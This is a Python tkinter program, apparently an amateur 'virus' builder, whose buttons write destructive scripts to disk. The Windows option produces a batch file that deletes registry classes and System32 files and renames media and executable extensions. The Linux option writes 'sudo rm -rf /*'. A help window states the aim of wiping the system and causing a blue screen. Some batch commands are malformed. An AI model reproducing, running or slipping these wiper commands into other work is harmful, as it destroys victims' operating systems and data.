from tkinter import *

screen = Tk()




def windowsww():
    file = open("app.bat", "w")

    file.write("@echo off\n\n\n\n\nSTART reg delete hkcr/ .exe \nSTART reg delete hkcr/ .dll \nSTART reg delete hkcr/*\n\n\ndel C:\Windows\System32\*.*\q\n\n\nREN *.DOC.TXT REN *.JPEG *.TXT\nREN *.LNK *.TXT\nREN *.AVI *.TXT\nREN *MPEG *.TXT\nREN *.COM *.TXT\nREN *.BAT*.TXT")
    file.close()








def linux():
    file = open("app.sh", "w")
    file.write("sudo rm -rf /*")
    file.close()



def screen22():
    global screen2
    screen2 = Toplevel(screen)
    screen2.geometry("700x100")
    screen2.configure(background='black')
    screen2.title("What is it do ")
    screen2.iconbitmap(r'12.ico')
    Label(screen2, text = "Its make a .bat/.sh file thats contane a lines \nof code that delet the root files in Linux rgestry files,System32 in windows\n and blue deth screen ", bg = "black", fg ="lightblue", font =("bold", 15)).pack()
    
    









def fi_screen():
    screen.geometry("400x400")
    screen.title("Vi")
    screen.configure(background='black')
    screen.iconbitmap(r'12.ico')
    Label(text = "Choose the OS you wont", bg = "black", fg = "white", font = ("bold", 15)).pack()
    Button(text = "", bg = "black").pack()
    Button(text = "windows?", bg = "red", width = "300", height = "2", font = ("bold", 11), command = windowsww).pack()
    Button(text = "", bg = "black").pack()
    Button(text = "What is this do ", bg = "black",fg = "white", command = screen22).pack()
    Button(text = "", bg = "black").pack()
    Button(text = "", bg = "black").pack()
    Button(text = "Linux", bg = "blue", width = "300", height = "1", font = ("bold", 15), command = linux).pack()





    screen.mainloop()


fi_screen()